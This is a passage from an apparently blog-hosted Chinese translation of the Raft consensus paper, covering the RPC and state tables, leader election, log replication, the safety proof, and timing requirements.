则为空</td></tr><tr><td>log[]</td><td>日志条目；每个条目包含了用于状态机的命令，以及领导人接收到该条目时的任期（初始索引为1）</td></tr></tbody></table><p>所有服务器上的易失性状态</p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>commitIndex</td><td>已知已提交的最高的日志条目的索引（初始值为0，单调递增）</td></tr><tr><td>lastApplied</td><td>已经被应用到状态机的最高的日志条目的索引（初始值为0，单调递增）</td></tr></tbody></table><p>领导人（服务器）上的易失性状态<br>(选举后已经重新初始化)</p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>nextIndex[]</td><td>对于每一台服务器，发送到该服务器的下一个日志条目的索引（初始值为领导人最后的日志条目的索引+1）</td></tr><tr><td>matchIndex[]</td><td>对于每一台服务器，已知的已经复制到该服务器的最高日志条目的索引（初始值为0，单调递增）</td></tr></tbody></table><p><strong>追加条目（AppendEntries）RPC</strong>：</p><p>由领导人调用，用于日志条目的复制，同时也被当做心跳使用</p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>term</td><td>领导人的任期</td></tr><tr><td>leaderId</td><td>领导人 ID 因此跟随者可以对客户端进行重定向（译者注：跟随者根据领导人 ID 把客户端的请求重定向到领导人，比如有时客户端把请求发给了跟随者而不是领导人）</td></tr><tr><td>prevLogIndex</td><td>紧邻新日志条目之前的那个日志条目的索引</td></tr><tr><td>prevLogTerm</td><td>紧邻新日志条目之前的那个日志条目的任期</td></tr><tr><td>entries[]</td><td>需要被保存的日志条目（被当做心跳使用时，则日志条目内容为空；为了提高效率可能一次性发送多个）</td></tr><tr><td>leaderCommit</td><td>领导人的已知已提交的最高的日志条目的索引</td></tr></tbody></table><table><thead><tr><th>返回值</th><th>解释</th></tr></thead><tbody><tr><td>term</td><td>当前任期，对于领导人而言 它会更新自己的任期</td></tr><tr><td>success</td><td>如果跟随者所含有的条目和 prevLogIndex 以及 prevLogTerm 匹配上了，则为 true</td></tr></tbody></table><p>接收者的实现：</p><ol><li>返回假 如果领导人的任期小于接收者的当前任期（译者注：这里的接收者是指跟随者或者候选人）（5.1 节）</li><li>返回假 如果接收者日志中没有包含这样一个条目 即该条目的任期在 prevLogIndex 上能和 prevLogTerm 匹配上<br>（译者注：在接收者日志中 如果能找到一个和 prevLogIndex 以及 prevLogTerm 一样的索引和任期的日志条目 则继续执行下面的步骤 否则返回假）（5.3 节）</li><li>如果一个已经存在的条目和新条目（译者注：即刚刚接收到的日志条目）发生了冲突（因为索引相同，任期不同），那么就删除这个已经存在的条目以及它之后的所有条目 （5.3 节）</li><li>追加日志中尚未存在的任何新条目</li><li>如果领导人的已知已提交的最高日志条目的索引大于接收者的已知已提交最高日志条目的索引（<code>leaderCommit &gt; commitIndex</code>），则把接收者的已知已经提交的最高的日志条目的索引commitIndex 重置为 领导人的已知已经提交的最高的日志条目的索引 leaderCommit 或者是 上一个新条目的索引 取两者的最小值</li></ol><p><strong>请求投票（RequestVote）RPC</strong>：</p><p>由候选人负责调用用来征集选票（5.2 节）</p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>term</td><td>候选人的任期号</td></tr><tr><td>candidateId</td><td>请求选票的候选人的 ID</td></tr><tr><td>lastLogIndex</td><td>候选人的最后日志条目的索引值</td></tr><tr><td>lastLogTerm</td><td>候选人最后日志条目的任期号</td></tr></tbody></table><table><thead><tr><th>返回值</th><th>解释</th></tr></thead><tbody><tr><td>term</td><td>当前任期号，以便于候选人去更新自己的任期号</td></tr><tr><td>voteGranted</td><td>候选人赢得了此张选票时为真</td></tr></tbody></table><p>接收者实现：</p><ol><li>如果<code>term &lt; currentTerm</code>返回 false （5.2 节）</li><li>如果 votedFor 为空或者为 candidateId，并且候选人的日志至少和自己一样新，那么就投票给他（5.2 节，5.4 节）</li></ol><p><strong>所有服务器需遵守的规则</strong>：</p><p>所有服务器：</p><ul><li>如果<code>commitIndex &gt; lastApplied</code>，则 lastApplied 递增，并将<code>log[lastApplied]</code>应用到状态机中（5.3 节）</li><li>如果接收到的 RPC 请求或响应中，任期号<code>T &gt; currentTerm</code>，则令 <code>currentTerm = T</code>，并切换为跟随者状态（5.1 节）</li></ul><p>跟随者（5.2 节）：</p><ul><li>响应来自候选人和领导人的请求</li><li>如果在超过选举超时时间的情况之前没有收到<strong>当前领导人</strong>（即该领导人的任期需与这个跟随者的当前任期相同）的心跳&#x2F;附加日志，或者是给某个候选人投了票，就自己变成候选人</li></ul><p>候选人（5.2 节）：</p><ul><li>在转变成候选人后就立即开始选举过程<ul><li>自增当前的任期号（currentTerm）</li><li>给自己投票</li><li>重置选举超时计时器</li><li>发送请求投票的 RPC 给其他所有服务器</li></ul></li><li>如果接收到大多数服务器的选票，那么就变成领导人</li><li>如果接收到来自新的领导人的附加日志（AppendEntries）RPC，则转变成跟随者</li><li>如果选举过程超时，则再次发起一轮选举</li></ul><p>领导人：</p><ul><li>一旦成为领导人：发送空的附加日志（AppendEntries）RPC（心跳）给其他所有的服务器；在一定的空余时间之后不停的重复发送，以防止跟随者超时（5.2 节）</li><li>如果接收到来自客户端的请求：附加条目到本地日志中，在条目被应用到状态机后响应客户端（5.3 节）</li><li>如果对于一个跟随者，最后日志条目的索引值大于等于 nextIndex（<code>lastLogIndex ≥ nextIndex</code>），则发送从 nextIndex 开始的所有日志条目：<ul><li>如果成功：更新相应跟随者的 nextIndex 和 matchIndex</li><li>如果因为日志不一致而失败，则 nextIndex 递减并重试</li></ul></li><li>假设存在 N 满足<code>N &gt; commitIndex</code>，使得大多数的 <code>matchIndex[i] ≥ N</code>以及<code>log[N].term == currentTerm</code> 成立，则令 <code>commitIndex = N</code>（5.3 和 5.4 节）</li></ul><p><img src="/2022/10/01/raft%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/桌面\项目\开源项目\Reading-note\kuberneters\ETCD\images\raft-图2.png" alt="图 2"></p><blockquote><p>图 2：一个关于 Raft 一致性算法的浓缩总结（不包括成员变换和日志压缩）。</p></blockquote><table><thead><tr><th>特性</th><th>解释</th></tr></thead><tbody><tr><td>选举安全特性</td><td>对于一个给定的任期号，最多只会有一个领导人被选举出来（5.2 节）</td></tr><tr><td>领导人只附加原则</td><td>领导人绝对不会删除或者覆盖自己的日志，只会增加（5.3 节）</td></tr><tr><td>日志匹配原则</td><td>如果两个日志在某一相同索引位置日志条目的任期号相同，那么我们就认为这两个日志从头到该索引位置之间的内容完全一致（5.3 节）</td></tr><tr><td>领导人完全特性</td><td>如果某个日志条目在某个任期号中已经被提交，那么这个条目必然出现在更大任期号的所有领导人中（5.4 节）</td></tr><tr><td>状态机安全特性</td><td>如果某一服务器已将给定索引位置的日志条目应用至其状态机中，则其他任何服务器在该索引位置不会应用不同的日志条目（5.4.3 节）</td></tr></tbody></table><p><img src="/2022/10/01/raft%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/桌面\项目\开源项目\Reading-note\kuberneters\ETCD\images\raft-图3.png" alt="图 3 "></p><blockquote><p>图 3：Raft 在任何时候都保证以上的各个特性。</p></blockquote><h3 id="5-1-Raft-基础"><a href="#5-1-Raft-基础" class="headerlink" title="5.1 Raft 基础"></a>5.1 Raft 基础</h3><p>一个 Raft 集群包含若干个服务器节点；5 个服务器节点是一个典型的例子，这允许整个系统容忍 2 个节点失效。在任何时刻，每一个服务器节点都处于这三个状态之一：领导人、跟随者或者候选人。在通常情况下，系统中只有一个领导人并且其他的节点全部都是跟随者。跟随者都是被动的：他们不会发送任何请求，只是简单的响应来自领导人或者候选人的请求。领导人处理所有的客户端请求（如果一个客户端和跟随者联系，那么跟随者会把请求重定向给领导人）。第三种状态，候选人，是用来在 5.2 节描述的选举新领导人时使用。图 4 展示了这些状态和他们之间的转换关系；这些转换关系会在接下来进行讨论。</p><p><img src="/2022/10/01/raft%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/桌面\项目\开源项目\Reading-note\kuberneters\ETCD\images\raft-图4.png" alt="图 4 "></p><blockquote><p>图 4：服务器状态。跟随者只响应来自其他服务器的请求。如果跟随者接收不到消息，那么他就会变成候选人并发起一次选举。获得集群中大多数选票的候选人将成为领导人。在一个任期内，领导人一直都会是领导人，直到自己宕机了。</p></blockquote><p><img src="/2022/10/01/raft%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/桌面\项目\开源项目\Reading-note\kuberneters\ETCD\images\raft-图5.png" alt="图 5"></p><blockquote><p>图 5：时间被划分成一个个的任期，每个任期始于一次选举。在选举成功后，领导人会管理整个集群直到任期结束。有时候选举会失败，那么这个任期就会没有领导人而结束。任期之间的切换可以在不同的时间不同的服务器上观察到。</p></blockquote><p>Raft 把时间分割成任意长度的<strong>任期</strong>，如图 5。任期用连续的整数标记。每一段任期从一次<strong>选举</strong>开始，就像章节 5.2 描述的一样，一个或者多个候选人尝试成为领导人。如果一个候选人赢得选举，然后他就在接下来的任期内充当领导人的职责。在某些情况下，一次选举过程会造成选票的瓜分。在这种情况下，这一任期会以没有领导人结束；一个新的任期（和一次新的选举）会很快重新开始。Raft 保证了在一个给定的任期内，最多只有一个领导人。</p><p>不同的服务器节点可能多次观察到任期之间的转换，但在某些情况下，一个节点也可能观察不到任何一次选举或者整个任期全程。任期在 Raft 算法中充当逻辑时钟的作用，任期使得服务器可以检测一些过期的信息：比如过期的领导人。每个节点存储一个当前任期号，这一编号在整个时期内单调递增。每当服务器之间通信的时候都会交换当前任期号；如果一个服务器的当前任期号比其他人小，那么他会更新自己的任期号到较大的任期号值。如果一个候选人或者领导人发现自己的任期号过期了，那么他会立即恢复成跟随者状态。如果一个节点接收到一个包含过期的任期号的请求，那么他会直接拒绝这个请求。</p><p>Raft 算法中服务器节点之间通信使用远程过程调用（RPCs），并且基本的一致性算法只需要两种类型的 RPCs。请求投票（RequestVote） RPCs 由候选人在选举期间发起（章节  5.2），然后附加条目（AppendEntries）RPCs 由领导人发起，用来复制日志和提供一种心跳机制（章节 5.3）。第 7 节为了在服务器之间传输快照增加了第三种 RPC。当服务器没有及时的收到 RPC 的响应时，会进行重试， 并且他们能够并行的发起 RPCs 来获得最佳的性能。</p><h3 id="5-2-领导人选举"><a href="#5-2-领导人选举" class="headerlink" title="5.2 领导人选举"></a>5.2 领导人选举</h3><p>Raft 使用一种心跳机制来触发领导人选举。当服务器程序启动时，他们都是跟随者身份。一个服务器节点继续保持着跟随者状态只要他从领导人或者候选人处接收到有效的 RPCs。领导人周期性的向所有跟随者发送心跳包（即不包含日志项内容的附加条目（AppendEntries） RPCs）来维持自己的权威。如果一个跟随者在一段时间里没有接收到任何消息，也就是<strong>选举超时</strong>，那么他就会认为系统中没有可用的领导人,并且发起选举以选出新的领导人。</p><p>要开始一次选举过程，跟随者先要增加自己的当前任期号并且转换到候选人状态。然后他会并行地向集群中的其他服务器节点发送请求投票的 RPCs 来给自己投票。候选人会继续保持着当前状态直到以下三件事情之一发生：(a) 他自己赢得了这次的选举，(b) 其他的服务器成为领导人，(c) 一段时间之后没有任何一个获胜的人。这些结果会分别的在下面的段落里进行讨论。</p><p>当一个候选人从整个集群的大多数服务器节点获得了针对同一个任期号的选票，那么他就赢得了这次选举并成为领导人。每一个服务器最多会对一个任期号投出一张选票，按照先来先服务的原则（注意：5.4 节在投票上增加了一点额外的限制）。要求大多数选票的规则确保了最多只会有一个候选人赢得此次选举（图 3 中的选举安全性）。一旦候选人赢得选举，他就立即成为领导人。然后他会向其他的服务器发送心跳消息来建立自己的权威并且阻止发起新的选举。</p><p>在等待投票的时候，候选人可能会从其他的服务器接收到声明它是领导人的附加条目（AppendEntries）RPC。如果这个领导人的任期号（包含在此次的 RPC中）不小于候选人当前的任期号，那么候选人会承认领导人合法并回到跟随者状态。 如果此次 RPC 中的任期号比自己小，那么候选人就会拒绝这次的 RPC 并且继续保持候选人状态。</p><p>第三种可能的结果是候选人既没有赢得选举也没有输：如果有多个跟随者同时成为候选人，那么选票可能会被瓜分以至于没有候选人可以赢得大多数人的支持。当这种情况发生的时候，每一个候选人都会超时，然后通过增加当前任期号来开始一轮新的选举。然而，没有其他机制的话，选票可能会被无限的重复瓜分。</p><p>Raft 算法使用随机选举超时时间的方法来确保很少会发生选票瓜分的情况，就算发生也能很快的解决。为了阻止选票起初就被瓜分，选举超时时间是从一个固定的区间（例如 150-300 毫秒）随机选择。这样可以把服务器都分散开以至于在大多数情况下只有一个服务器会选举超时；然后他赢得选举并在其他服务器超时之前发送心跳包。同样的机制被用在选票瓜分的情况下。每一个候选人在开始一次选举的时候会重置一个随机的选举超时时间，然后在超时时间内等待投票的结果；这样减少了在新的选举中另外的选票瓜分的可能性。9.3 节展示了这种方案能够快速的选出一个领导人。</p><p>领导人选举这个例子，体现了可理解性原则是如何指导我们进行方案设计的。起初我们计划使用一种排名系统：每一个候选人都被赋予一个唯一的排名，供候选人之间竞争时进行选择。如果一个候选人发现另一个候选人拥有更高的排名，那么他就会回到跟随者状态，这样高排名的候选人能够更加容易的赢得下一次选举。但是我们发现这种方法在可用性方面会有一点问题（如果高排名的服务器宕机了，那么低排名的服务器可能会超时并再次进入候选人状态。而且如果这个行为发生得足够快，则可能会导致整个选举过程都被重置掉）。我们针对算法进行了多次调整，但是每次调整之后都会有新的问题。最终我们认为随机重试的方法是更加明显和易于理解的。</p><h3 id="5-3-日志复制"><a href="#5-3-日志复制" class="headerlink" title="5.3 日志复制"></a>5.3 日志复制</h3><p>一旦一个领导人被选举出来，他就开始为客户端提供服务。客户端的每一个请求都包含一条被复制状态机执行的指令。领导人把这条指令作为一条新的日志条目附加到日志中去，然后并行地发起附加条目 RPCs 给其他的服务器，让他们复制这条日志条目。当这条日志条目被安全地复制（下面会介绍），领导人会应用这条日志条目到它的状态机中然后把执行的结果返回给客户端。如果跟随者崩溃或者运行缓慢，再或者网络丢包，领导人会不断的重复尝试附加日志条目 RPCs （尽管已经回复了客户端）直到所有的跟随者都最终存储了所有的日志条目。</p><p><img src="/2022/10/01/raft%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/桌面\项目\开源项目\Reading-note\kuberneters\ETCD\images\raft-图6.png" alt="图 6"></p><blockquote><p>图 6：日志由有序序号标记的条目组成。每个条目都包含创建时的任期号（图中框中的数字），和一个状态机需要执行的指令。一个条目当可以安全地被应用到状态机中去的时候，就认为是可以提交了。</p></blockquote><p>日志以图 6 展示的方式组织。每一个日志条目存储一条状态机指令和从领导人收到这条指令时的任期号。日志中的任期号用来检查是否出现不一致的情况，同时也用来保证图 3 中的某些性质。每一条日志条目同时也都有一个整数索引值来表明它在日志中的位置。</p><p>领导人来决定什么时候把日志条目应用到状态机中是安全的；这种日志条目被称为<strong>已提交</strong>。Raft 算法保证所有已提交的日志条目都是持久化的并且最终会被所有可用的状态机执行。在领导人将创建的日志条目复制到大多数的服务器上的时候，日志条目就会被提交（例如在图 6 中的条目 7）。同时，领导人的日志中之前的所有日志条目也都会被提交，包括由其他领导人创建的条目。5.4 节会讨论某些当在领导人改变之后应用这条规则的隐晦内容，同时他也展示了这种提交的定义是安全的。领导人跟踪了最大的将会被提交的日志项的索引，并且索引值会被包含在未来的所有附加日志 RPCs （包括心跳包），这样其他的服务器才能最终知道领导人的提交位置。一旦跟随者知道一条日志条目已经被提交，那么他也会将这个日志条目应用到本地的状态机中（按照日志的顺序）。</p><p>我们设计了 Raft 的日志机制来维护不同服务器日志之间的高层次的一致性。这么做不仅简化了系统的行为也使其更具有可预测性，同时它也是安全性保证的一个重要组件。Raft 维护着以下的特性，这些特性共同组成了图 3 中的<strong>日志匹配特性（Log Matching Property）</strong>：</p><ul><li>如果在不同的日志中的两个条目拥有相同的索引和任期号，那么他们存储了相同的指令。</li><li>如果在不同的日志中的两个条目拥有相同的索引和任期号，那么他们之前的所有日志条目也全部相同。</li></ul><p>第一个特性来自这样的一个事实，领导人最多在一个任期里在指定的一个日志索引位置创建一条日志条目，同时日志条目在日志中的位置也从来不会改变。第二个特性由附加日志 RPC 的一个简单的一致性检查所保证。在发送附加日志 RPC 的时候，领导人会把新的日志条目前紧挨着的条目的索引位置和任期号包含在日志内。如果跟随者在它的日志中找不到包含相同索引位置和任期号的条目，那么他就会拒绝接收新的日志条目。一致性检查就像一个归纳步骤：一开始空的日志状态肯定是满足日志匹配特性的，然后一致性检查在日志扩展的时候保护了日志匹配特性。因此，每当附加日志 RPC 返回成功时，领导人就知道跟随者的日志一定是和自己相同的了。</p><p>在正常的操作中，领导人和跟随者的日志保持一致性，所以附加日志 RPC 的一致性检查从来不会失败。然而，领导人崩溃的情况会使得日志处于不一致的状态（老的领导人可能还没有完全复制所有的日志条目）。这种不一致问题会在领导人和跟随者的一系列崩溃下加剧。图 7 展示了跟随者的日志可能和新的领导人不同。跟随者可能会丢失一些在新的领导人中存在的日志条目，他也可能拥有一些领导人没有的日志条目，或者两者都发生。丢失或者多出日志条目可能会持续多个任期。</p><p><img src="/2022/10/01/raft%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/桌面\项目\开源项目\Reading-note\kuberneters\ETCD\images\raft-图7.png" alt="图 7"></p><blockquote><p>图 7：当一个领导人成功当选时，跟随者可能是任何情况（a-f）。每一个盒子表示是一个日志条目；里面的数字表示任期号。跟随者可能会缺少一些日志条目（a-b），可能会有一些未被提交的日志条目（c-d），或者两种情况都存在（e-f）。例如，场景 f 可能会这样发生，某服务器在任期 2 的时候是领导人，已附加了一些日志条目到自己的日志中，但在提交之前就崩溃了；很快这个机器就被重启了，在任期 3 重新被选为领导人，并且又增加了一些日志条目到自己的日志中；在任期 2 和任期 3 的日志被提交之前，这个服务器又宕机了，并且在接下来的几个任期里一直处于宕机状态。</p></blockquote><p>在 Raft 算法中，领导人是通过强制跟随者直接复制自己的日志来处理不一致问题的。这意味着在跟随者中的冲突的日志条目会被领导人的日志覆盖。5.4 节会阐述如何通过增加一些限制来使得这样的操作是安全的。</p><p>要使得跟随者的日志进入和自己一致的状态，领导人必须找到最后两者达成一致的地方，然后删除跟随者从那个点之后的所有日志条目，并发送自己在那个点之后的日志给跟随者。所有的这些操作都在进行附加日志 RPCs 的一致性检查时完成。领导人针对每一个跟随者维护了一个 <strong>nextIndex</strong>，这表示下一个需要发送给跟随者的日志条目的索引地址。当一个领导人刚获得权力的时候，他初始化所有的 nextIndex 值为自己的最后一条日志的 index 加 1（图 7 中的 11）。如果一个跟随者的日志和领导人不一致，那么在下一次的附加日志 RPC 时的一致性检查就会失败。在被跟随者拒绝之后，领导人就会减小 nextIndex 值并进行重试。最终 nextIndex 会在某个位置使得领导人和跟随者的日志达成一致。当这种情况发生，附加日志 RPC 就会成功，这时就会把跟随者冲突的日志条目全部删除并且加上领导人的日志。一旦附加日志 RPC 成功，那么跟随者的日志就会和领导人保持一致，并且在接下来的任期里一直继续保持。</p><blockquote><p>如果需要的话，算法可以通过减少被拒绝的附加日志 RPCs 的次数来优化。例如，当附加日志 RPC 的请求被拒绝的时候，跟随者可以(返回)冲突条目的任期号和该任期号对应的最小索引地址。借助这些信息，领导人可以减小 nextIndex 一次性越过该冲突任期的所有日志条目；这样就变成每个任期需要一次附加条目 RPC 而不是每个条目一次。在实践中，我们十分怀疑这种优化是否是必要的，因为失败是很少发生的并且也不大可能会有这么多不一致的日志。</p></blockquote><p>通过这种机制，领导人在获得权力的时候就不需要任何特殊的操作来恢复一致性。他只需要进行正常的操作，然后日志就能在回复附加日志 RPC 的一致性检查失败的时候自动趋于一致。领导人从来不会覆盖或者删除自己的日志（图 3 的领导人只附加特性）。</p><p>日志复制机制展示出了第 2 节中形容的一致性特性：Raft 能够接受，复制并应用新的日志条目只要大部分的机器是工作的；在通常的情况下，新的日志条目可以在一次 RPC 中被复制给集群中的大多数机器；并且单个的缓慢的跟随者不会影响整体的性能。</p><h3 id="5-4-安全性"><a href="#5-4-安全性" class="headerlink" title="5.4 安全性"></a>5.4 安全性</h3><p>前面的章节里描述了 Raft 算法是如何选举和复制日志的。然而，到目前为止描述的机制并不能充分的保证每一个状态机会按照相同的顺序执行相同的指令。例如，一个跟随者可能会进入不可用状态同时领导人已经提交了若干的日志条目，然后这个跟随者可能会被选举为领导人并且覆盖这些日志条目；因此，不同的状态机可能会执行不同的指令序列。</p><p>这一节通过在领导选举的时候增加一些限制来完善 Raft 算法。这一限制保证了任何的领导人对于给定的任期号，都拥有了之前任期的所有被提交的日志条目（图 3 中的领导人完整特性）。增加这一选举时的限制，我们对于提交时的规则也更加清晰。最终，我们将展示对于<strong>领导人完整特性（Leader Completeness Property）</strong> 的简要证明，并且说明该特性是如何引导复制状态机做出正确行为的。</p><h4 id="5-4-1-选举限制"><a href="#5-4-1-选举限制" class="headerlink" title="5.4.1 选举限制"></a>5.4.1 选举限制</h4><p>在任何基于领导人的一致性算法中，领导人都必须存储所有已经提交的日志条目。在某些一致性算法中，例如 Viewstamped Replication，某个节点即使是一开始并没有包含所有已经提交的日志条目，它也能被选为领导人。这些算法都包含一些额外的机制来识别丢失的日志条目并把他们传送给新的领导人，要么是在选举阶段要么在之后很快进行。不幸的是，这种方法会导致相当大的额外的机制和复杂性。Raft 使用了一种更加简单的方法，它可以保证在选举的时候新的领导人拥有所有之前任期中已经提交的日志条目，而不需要传送这些日志条目给领导人。这意味着日志条目的传送是单向的，只从领导人传给跟随者，并且领导人从不会覆盖自身本地日志中已经存在的条目。</p><p>Raft 使用投票的方式来阻止一个候选人赢得选举，除非这个候选人包含了所有已经提交的日志条目。候选人为了赢得选举必须联系集群中的大部分节点，这意味着每一个已经提交的日志条目在这些服务器节点中肯定存在于至少一个节点上。如果候选人的日志至少和大多数的服务器节点一样新（这个新的定义会在下面讨论），那么他一定持有了所有已经提交的日志条目。请求投票（RequestVote） RPC 实现了这样的限制：RPC 中包含了候选人的日志信息，然后投票人会拒绝掉那些日志没有自己新的投票请求。</p><p>Raft 通过比较两份日志中最后一条日志条目的索引值和任期号定义谁的日志比较新。如果两份日志最后的条目的任期号不同，那么任期号大的日志更加新。如果两份日志最后的条目任期号相同，那么日志比较长的那个就更加新。</p><h4 id="5-4-2-提交之前任期内的日志条目"><a href="#5-4-2-提交之前任期内的日志条目" class="headerlink" title="5.4.2 提交之前任期内的日志条目"></a>5.4.2 提交之前任期内的日志条目</h4><p>如同 5.3 节介绍的那样，领导人知道一条当前任期内的日志记录是可以被提交的，只要它被存储到了大多数的服务器上。如果一个领导人在提交日志条目之前崩溃了，未来后续的领导人会继续尝试复制这条日志记录。然而，一个领导人不能断定一个之前任期里的日志条目被保存到大多数服务器上的时候就一定已经提交了。图 8 展示了一种情况，一条已经被存储到大多数节点上的老日志条目，也依然有可能会被未来的领导人覆盖掉。</p><p><img src="/2022/10/01/raft%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/桌面\项目\开源项目\Reading-note\kuberneters\ETCD\images\raft-图8.png" alt="图 8"></p><blockquote><p>图 8：如图的时间序列展示了为什么领导人无法决定对老任期号的日志条目进行提交。在 (a) 中，S1 是领导人，部分的(跟随者)复制了索引位置 2 的日志条目。在 (b) 中，S1 崩溃了，然后 S5 在任期 3 里通过 S3、S4 和自己的选票赢得选举，然后从客户端接收了一条不一样的日志条目放在了索引 2 处。然后到 (c)，S5 又崩溃了；S1 重新启动，选举成功，开始复制日志。在这时，来自任期 2 的那条日志已经被复制到了集群中的大多数机器上，但是还没有被提交。如果 S1 在 (d) 中又崩溃了，S5 可以重新被选举成功（通过来自 S2，S3 和 S4 的选票），然后覆盖了他们在索引 2 处的日志。反之，如果在崩溃之前，S1 把自己主导的新任期里产生的日志条目复制到了大多数机器上，就如 (e) 中那样，那么在后面任期里面这些新的日志条目就会被提交（因为 S5 就不可能选举成功）。 这样在同一时刻就同时保证了，之前的所有老的日志条目就会被提交。</p></blockquote><p>为了消除图 8 里描述的情况，Raft 永远不会通过计算副本数目的方式去提交一个之前任期内的日志条目。只有领导人当前任期里的日志条目通过计算副本数目可以被提交；一旦当前任期的日志条目以这种方式被提交，那么由于日志匹配特性，之前的日志条目也都会被间接的提交。在某些情况下，领导人可以安全的知道一个老的日志条目是否已经被提交（例如，该条目是否存储到所有服务器上），但是 Raft 为了简化问题使用一种更加保守的方法。</p><p>当领导人复制之前任期里的日志时，Raft 会为所有日志保留原始的任期号, 这在提交规则上产生了额外的复杂性。在其他的一致性算法中，如果一个新的领导人要重新复制之前的任期里的日志时，它必须使用当前新的任期号。Raft 使用的方法更加容易辨别出日志，因为它可以随着时间和日志的变化对日志维护着同一个任期编号。另外，和其他的算法相比，Raft 中的新领导人只需要发送更少日志条目（其他算法中必须在他们被提交之前发送更多的冗余日志条目来为他们重新编号）。</p><h4 id="5-4-3-安全性论证"><a href="#5-4-3-安全性论证" class="headerlink" title="5.4.3 安全性论证"></a>5.4.3 安全性论证</h4><p>在给定了完整的 Raft 算法之后，我们现在可以更加精确的讨论领导人完整性特性（这一讨论基于 9.2 节的安全性证明）。我们假设领导人完全性特性是不存在的，然后我们推出矛盾来。假设任期 T 的领导人（领导人 T）在任期内提交了一条日志条目，但是这条日志条目没有被存储到未来某个任期的领导人的日志中。设大于 T 的最小任期 U 的领导人 U 没有这条日志条目。</p><p><img src="/2022/10/01/raft%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/桌面\项目\开源项目\Reading-note\kuberneters\ETCD\images\raft-图9.png" alt="图 9"></p><blockquote><p>图 9：如果 S1 （任期 T 的领导人）在它的任期里提交了一条新的日志，然后 S5 在之后的任期 U 里被选举为领导人，那么至少会有一个机器，如 S3，既拥有来自 S1 的日志，也给 S5 投票了。</p></blockquote><ol><li>在领导人 U 选举的时候一定没有那条被提交的日志条目（领导人从不会删除或者覆盖任何条目）。</li><li>领导人 T 复制这条日志条目给集群中的大多数节点，同时，领导人 U 从集群中的大多数节点赢得了选票。因此，至少有一个节点（投票者、选民）同时接受了来自领导人 T 的日志条目，并且给领导人 U 投票了，如图 9。这个投票者是产生这个矛盾的关键。</li><li>这个投票者必须在给领导人 U 投票之前先接受了从领导人 T 发来的已经被提交的日志条目；否则他就会拒绝来自领导人 T 的附加日志请求（因为此时他的任期号会比 T 大）。</li><li>投票者在给领导人 U 投票时依然保存有这条日志条目，因为任何中间的领导人都包含该日志条目（根据上述的假设），领导人从不会删除条目，并且跟随者只有在和领导人冲突的时候才会删除条目。</li><li>投票者把自己选票投给领导人 U 时，领导人 U 的日志必须和投票者自己一样新。这就导致了两者矛盾之一。</li><li>首先，如果投票者和领导人 U 的最后一条日志的任期号相同，那么领导人 U 的日志至少和投票者一样长，所以领导人 U 的日志一定包含所有投票者的日志。这是另一处矛盾，因为投票者包含了那条已经被提交的日志条目，但是在上述的假设里，领导人 U 是不包含的。</li><li>除此之外，领导人 U 的最后一条日志的任期号就必须比投票人大了。此外，他也比 T 大，因为投票人的最后一条日志的任期号至少和 T 一样大（他包含了来自任期 T 的已提交的日志）。创建了领导人 U 最后一条日志的之前领导人一定已经包含了那条被提交的日志（根据上述假设，领导人 U 是第一个不包含该日志条目的领导人）。所以，根据日志匹配特性，领导人 U 一定也包含那条被提交的日志，这里产生矛盾。</li><li>这里完成了矛盾。因此，所有比 T 大的领导人一定包含了所有来自 T 的已经被提交的日志。</li><li>日志匹配原则保证了未来的领导人也同时会包含被间接提交的条目，例如图 8 (e) 中的索引 2。</li></ol><p>通过领导人完全特性，我们就能证明图 3 中的状态机安全特性，即如果服务器已经在某个给定的索引值应用了日志条目到自己的状态机里，那么其他的服务器不会应用一个不一样的日志到同一个索引值上。在一个服务器应用一条日志条目到他自己的状态机中时，他的日志必须和领导人的日志，在该条目和之前的条目上相同，并且已经被提交。现在我们来考虑在任何一个服务器应用一个指定索引位置的日志的最小任期；日志完全特性保证拥有更高任期号的领导人会存储相同的日志条目，所以之后的任期里应用某个索引位置的日志条目也会是相同的值。因此，状态机安全特性是成立的。</p><p>最后，Raft 要求服务器按照日志中索引位置顺序应用日志条目。和状态机安全特性结合起来看，这就意味着所有的服务器会应用相同的日志序列集到自己的状态机中，并且是按照相同的顺序。</p><h3 id="5-5-跟随者和候选人崩溃"><a href="#5-5-跟随者和候选人崩溃" class="headerlink" title="5.5 跟随者和候选人崩溃"></a>5.5 跟随者和候选人崩溃</h3><p>到目前为止，我们都只关注了领导人崩溃的情况。跟随者和候选人崩溃后的处理方式比领导人要简单的多，并且他们的处理方式是相同的。如果跟随者或者候选人崩溃了，那么后续发送给他们的 RPCs 都会失败。Raft 中处理这种失败就是简单地通过无限的重试；如果崩溃的机器重启了，那么这些 RPC 就会完整的成功。如果一个服务器在完成了一个 RPC，但是还没有响应的时候崩溃了，那么在他重新启动之后就会再次收到同样的请求。Raft 的 RPCs 都是幂等的，所以这样重试不会造成任何问题。例如一个跟随者如果收到附加日志请求但是他已经包含了这一日志，那么他就会直接忽略这个新的请求。</p><h3 id="5-6-时间和可用性"><a href="#5-6-时间和可用性" class="headerlink" title="5.6 时间和可用性"></a>5.6 时间和可用性</h3><p>Raft 的要求之一就是安全性不能依赖时间：整个系统不能因为某些事件运行的比预期快一点或者慢一点就产生了错误的结果。但是，可用性（系统可以及时的响应客户端）不可避免的要依赖于时间。例如，如果消息交换比服务器故障间隔时间长，候选人将没有足够长的时间来赢得选举；没有一个稳定的领导人，Raft 将无法工作。</p><p>领导人选举是 Raft 中对时间要求最为关键的方面。Raft 可以选举并维持一个稳定的领导人,只要系统满足下面的时间要求：</p><blockquote><p>广播时间（broadcastTime）  &lt;&lt;  选举超时时间（electionTimeout） &lt;&lt;  平均故障间隔时间（MTBF）</p></blockquote><p>在这个不等式中，广播时间指的是从一个服务器并行的发送 RPCs 给集群中的其他服务器并接收响应的平均时间；选举超时时间就是在 5.2 